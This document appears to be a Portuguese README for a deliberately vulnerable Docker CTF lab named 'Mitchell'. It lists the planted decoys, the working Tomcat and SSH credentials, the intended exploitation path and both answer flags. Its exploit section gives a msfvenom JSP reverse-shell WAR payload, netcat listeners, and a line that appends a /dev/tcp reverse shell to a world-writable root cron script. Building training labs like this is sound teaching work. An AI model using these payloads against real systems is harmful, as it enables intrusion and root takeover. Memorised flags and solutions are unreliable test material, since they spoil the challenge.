# Máquina CTF Mitchell

## 📋 Informações Gerais

- **Nome**: Mitchell
- **Categoria**: Web
- **Dificuldade**: Medium
- **Tempo Estimado**: 90-120 minutos
- **Portas Expostas**: 9090 (Tomcat), 8080 (Serviço Falso)

## 🎯 Objetivo

Explorar uma aplicação Tomcat vulnerável, escalar privilégios através de um script cron mal configurado e capturar as flags de usuário e root.

## 🚀 Como Executar

### Usando Docker Compose (Recomendado)

```bash
cd labs/docker/mitchell
docker-compose up --build
```

### Usando Docker Diretamente

```bash
cd labs/docker/mitchell
docker build -t mitchell .
docker run -p 9090:9090 -p 8080:8080 --name mitchell mitchell
```

## 🔍 Informações de Acesso

- **Tomcat Manager**: http://localhost:9090/manager
- **Serviço Falso**: http://localhost:8080
- **Usuário SSH**: alex
- **Senha SSH**: Password123!

## 🎭 Pegadinhas Implementadas

1. **Credenciais Falsas**: Arquivo `/opt/tomcat/conf/credentials.txt` com credenciais que não funcionam
2. **Script Enganoso**: `system_monitor.sh` que parece importante mas é inútil
3. **Flag Falsa User**: `/home/alex/user.txt` contém flag falsa
4. **Flag Real User**: Escondida em `/home/alex/.hidden/.config/user.flag`
5. **Flag Falsa Root**: `/root/system.flag` contém flag falsa
6. **Flag Real Root**: `/root/root.flag` com permissões restritas
7. **Serviço Falso**: Porta 8080 com serviço HTTP simples para distrair
8. **Múltiplos Usuários Tomcat**: Apenas `webadmin:C0mpl3xP@ss!` funciona
9. **Logs Enganosos**: Mensagens de segurança falsas

## 🛤️ Caminho de Exploração Esperado

### 1. Reconhecimento
```bash
nmap -p- -sV <IP>
# Descobrir Tomcat na porta 9090 e serviço na porta 8080
```

### 2. Enumeração do Tomcat
- Acessar http://<IP>:9090
- Tentar credenciais comuns (falharão)
- Encontrar arquivo `credentials.txt` (credenciais falsas)
- Descobrir credenciais reais: `webadmin:C0mpl3xP@ss!`

### 3. Acesso Inicial via Tomcat Manager
- Fazer login no Manager App
- Criar arquivo WAR malicioso com shell reversa
- Fazer upload via interface do Tomcat
- Ganhar shell como usuário `tomcat`

### 4. Escalada para Usuário
- Enumerar sistema
- Encontrar flag falsa em `/home/alex/user.txt`
- Procurar arquivos ocultos
- Descobrir flag real em `/home/alex/.hidden/.config/user.flag`

### 5. Escalada de Privilégios para Root
- Enumerar processos e cron jobs
- Descobrir script `/home/alex/scripts/backup_task.sh` executado como root
- Verificar permissões (777 - gravável por todos)
- Modificar script para adicionar shell reversa ou comando malicioso
- Aguardar execução do cron (a cada 2 minutos)
- Ganhar shell root

### 6. Captura da Flag Root
```bash
cat /root/root.flag
# xack{R00t_4cc3ss_Gr4nt3d_Succ3ss}
```

## 🏴 Flags

- **User Flag**: `xack{Us3r_Fl4g_R3al_0n3_H3r3}`
- **Root Flag**: `xack{R00t_4cc3ss_Gr4nt3d_Succ3ss}`

## 🔧 Exemplo de Exploit

### Criando Shell Reversa WAR

```bash
# Gerar payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f war -o shell.war

# Fazer upload via Tomcat Manager
# Acessar: http://<IP>:9090/shell/

# Listener
nc -lvnp 4444
```

### Escalando Privilégios

```bash
# Após ganhar shell como tomcat
# Modificar script de backup
echo 'bash -i >& /dev/tcp/<SEU_IP>/5555 0>&1' >> /home/alex/scripts/backup_task.sh

# Listener para shell root
nc -lvnp 5555

# Aguardar 2 minutos para execução do cron
```

## 📝 Notas

- O Tomcat está configurado na porta **9090** (não 8080)
- A porta 8080 tem um serviço falso para distrair
- Múltiplas flags falsas estão espalhadas pelo sistema
- O script de cron executa a cada **2 minutos**
- Permissões do script de backup são **777** (vulnerável)

## 🛡️ Conceitos Aprendidos

- Exploração de Tomcat Manager
- Upload de arquivos WAR maliciosos
- Enumeração de sistema Linux
- Identificação de cron jobs
- Escalada de privilégios via scripts mal configurados
- Importância de permissões adequadas
- Técnicas de ofuscação e distração em CTFs
